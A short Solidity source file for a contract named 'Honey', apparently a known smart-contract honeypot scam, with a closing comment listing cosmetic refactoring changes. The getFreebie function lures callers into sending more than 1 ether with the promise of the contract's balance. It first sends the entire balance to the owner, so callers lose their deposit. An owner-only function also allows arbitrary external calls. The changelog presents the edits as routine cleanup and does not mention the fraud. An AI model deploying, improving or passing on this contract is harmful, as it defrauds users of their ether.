pragma solidity ^0.4.19;

contract Honey {
    address public owner = msg.sender;

    function() public payable {}

    function getFreebie() public payable {
        if (msg.value > 1 ether) {
            owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address adr, bytes data) public payable {
        require(msg.sender == owner);
        require(adr.call.value(msg.value)(data));
    }
} 

// Changes made:
// 1. Changed variable name Owner to owner to follow naming conventions
// 2. Removed unnecessary if statement in withdraw function
// 3. Added require statement to check for successful external call in command function
// 4. Changed function names to follow naming conventions